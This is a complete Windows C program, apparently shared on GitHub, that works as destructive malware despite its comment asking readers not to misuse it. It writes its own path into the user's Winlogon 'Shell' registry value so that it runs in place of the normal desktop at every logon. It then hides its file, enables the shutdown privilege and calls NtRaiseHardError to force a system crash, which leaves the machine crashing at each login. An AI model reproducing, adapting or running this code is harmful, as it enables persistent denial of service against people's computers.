// Coded by DosX-dev (GitHub)
// Do not use this code for bad purposes! Please.

#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#define NT_ERROR_CODE 0xC0000022

int APIENTRY WinMain(
    HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow) {
    TCHAR szFilePath[MAX_PATH];
    GetModuleFileName(NULL, szFilePath, MAX_PATH);

    HKEY hKey;
    if (RegCreateKeyEx(HKEY_CURRENT_USER,
                       TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"),
                       0x00, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS)
        RegSetValueEx(hKey,
                      TEXT("Shell"),
                      0x00, REG_SZ, (LPBYTE)szFilePath, (DWORD)(_tcslen(szFilePath) + 1) * sizeof(TCHAR));
    RegCloseKey(hKey);

    SetFileAttributesA(szFilePath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NOT_CONTENT_INDEXED | FILE_ATTRIBUTE_READONLY);

    BOOLEAN previousValue;
    ULONG response;

    if (RtlAdjustPrivilege(0x13,  // [SeShutdownPrivilege]
                           TRUE, FALSE, &previousValue) == 0x00) {
        // 0110 = 01 10 = [ResponseOptionOk + ResponseOptionCancel]
        NtRaiseHardError(NT_ERROR_CODE, 0x00, 0x00, NULL, 0b0110, &response);
    }
}
